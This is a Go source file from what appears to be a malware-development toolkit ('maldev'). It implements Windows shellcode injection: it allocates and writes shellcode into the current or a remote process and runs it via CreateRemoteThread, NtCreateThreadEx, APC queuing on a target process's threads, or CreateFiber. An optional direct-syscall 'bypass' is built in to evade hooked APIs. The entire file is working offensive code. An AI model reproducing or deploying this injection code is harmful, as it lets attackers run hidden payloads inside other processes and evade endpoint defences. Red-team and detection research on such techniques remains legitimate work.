//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// --- MemorySetup implementations ---

// localMemory sets up executable memory in the current process.
type localMemory struct {
	caller *wsyscall.Caller
}

// LocalMemory returns a MemorySetup that allocates in the current process.
// Pass nil for standard WinAPI, or a Caller for syscall bypass.
func LocalMemory(caller *wsyscall.Caller) MemorySetup {
	return &localMemory{caller: caller}
}

func (m *localMemory) Setup(shellcode []byte) (uintptr, error) {
	return allocateAndWriteMemoryLocalWithCaller(shellcode, m.caller)
}

// remoteMemory sets up executable memory in a remote process.
type remoteMemory struct {
	process windows.Handle
	caller  *wsyscall.Caller
}

// RemoteMemory returns a MemorySetup that allocates in a remote process.
// Pass nil for standard WinAPI, or a Caller for syscall bypass.
func RemoteMemory(process windows.Handle, caller *wsyscall.Caller) MemorySetup {
	return &remoteMemory{process: process, caller: caller}
}

func (m *remoteMemory) Setup(shellcode []byte) (uintptr, error) {
	return allocateAndWriteMemoryRemoteWithCaller(m.process, shellcode, m.caller)
}

// --- Executor implementations ---

// createRemoteThreadExec creates a remote thread via CreateRemoteThread or NtCreateThreadEx.
type createRemoteThreadExec struct {
	process windows.Handle
	caller  *wsyscall.Caller
}

// CreateRemoteThreadExecutor returns an Executor that creates a thread in a remote process.
func CreateRemoteThreadExecutor(process windows.Handle, caller *wsyscall.Caller) Executor {
	return &createRemoteThreadExec{process: process, caller: caller}
}

func (e *createRemoteThreadExec) Execute(addr uintptr) error {
	if e.caller != nil {
		var hThread uintptr
		r, err := e.caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			uintptr(api.ThreadAllAccess),
			0, uintptr(e.process), addr, 0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
		}
		windows.CloseHandle(windows.Handle(hThread))
		return nil
	}

	hThread, _, err := api.ProcCreateRemoteThread.Call(
		uintptr(e.process), 0, 0, addr, 0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// createLocalThreadExec creates a thread in the current process via NtCreateThreadEx.
type createLocalThreadExec struct {
	caller    *wsyscall.Caller
	waitMs    uint32
}

// CreateLocalThreadExecutor returns an Executor that creates a thread in the current process.
// waitMs is the timeout in milliseconds to wait for the thread to start (0 = no wait).
// Pass 100 for the typical default.
func CreateLocalThreadExecutor(caller *wsyscall.Caller, waitMs uint32) Executor {
	return &createLocalThreadExec{caller: caller, waitMs: waitMs}
}

func (e *createLocalThreadExec) Execute(addr uintptr) error {
	currentProcess := ^uintptr(0)
	var hThread uintptr

	if e.caller != nil {
		r, err := e.caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			uintptr(api.ThreadAllAccess),
			0, currentProcess, addr, 0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		status, _, _ := api.ProcNtCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&hThread)),
			api.ThreadAllAccess,
			0, currentProcess, addr, 0,
			0, 0, 0, 0, 0,
		)
		if status != 0 {
			return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X", status)
		}
	}

	if e.waitMs > 0 {
		api.ProcWaitForSingleObject.Call(hThread, uintptr(e.waitMs))
	}
	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// queueAPCExec queues a user APC on target threads.
type queueAPCExec struct {
	pid    int
	caller *wsyscall.Caller
}

// QueueAPCExecutor returns an Executor that queues APC on threads of a target PID.
func QueueAPCExecutor(pid int, caller *wsyscall.Caller) Executor {
	return &queueAPCExec{pid: pid, caller: caller}
}

func (e *queueAPCExec) Execute(addr uintptr) error {
	threadIDs, err := findAllThreads(e.pid)
	if err != nil {
		return fmt.Errorf("find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for PID %d", e.pid)
	}

	for _, tid := range threadIDs {
		hThread, openErr := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false, tid,
		)
		if openErr != nil {
			continue
		}

		if e.caller != nil {
			var prevCount uint32
			e.caller.Call("NtSuspendThread",
				uintptr(hThread), uintptr(unsafe.Pointer(&prevCount)))

			r, _ := e.caller.Call("NtQueueApcThread",
				uintptr(hThread), addr, 0, 0, 0)

			windows.ResumeThread(hThread)
			windows.CloseHandle(hThread)

			if r == 0 {
				return nil
			}
		} else {
			api.ProcSuspendThread.Call(uintptr(hThread))
			ret, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)
			windows.ResumeThread(hThread)
			windows.CloseHandle(hThread)

			if ret != 0 {
				return nil
			}
		}
	}
	return fmt.Errorf("failed to queue APC on any thread")
}

// fiberExec executes shellcode via CreateFiber.
type fiberExec struct{}

// FiberExecutor returns an Executor that uses CreateFiber for self-injection.
func FiberExecutor() Executor { return &fiberExec{} }

func (e *fiberExec) Execute(addr uintptr) error {
	mainFiber, _, err := api.ProcConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return fmt.Errorf("ConvertThreadToFiber: %w", err)
	}
	shellcodeFiber, _, err := api.ProcCreateFiber.Call(0, addr, 0)
	if shellcodeFiber == 0 {
		return fmt.Errorf("CreateFiber: %w", err)
	}
	api.ProcSwitchToFiber.Call(shellcodeFiber)
	return nil
}
